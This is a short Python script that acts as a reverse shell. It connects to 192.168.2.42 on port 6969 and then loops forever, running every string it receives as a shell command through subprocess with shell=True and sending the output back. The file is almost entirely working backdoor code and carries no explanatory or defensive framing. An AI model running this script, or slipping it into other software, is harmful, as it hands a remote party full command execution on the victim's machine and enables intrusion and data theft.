import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.2.42", 6969))

# connection.send(beginning_message.encode('utf-8'))

while True:
    while True:
        received_data = connection.recv(1024)
        command_result = execute_system_command(received_data.decode('utf-8'))
        connection.send(command_result)

# connection.close()
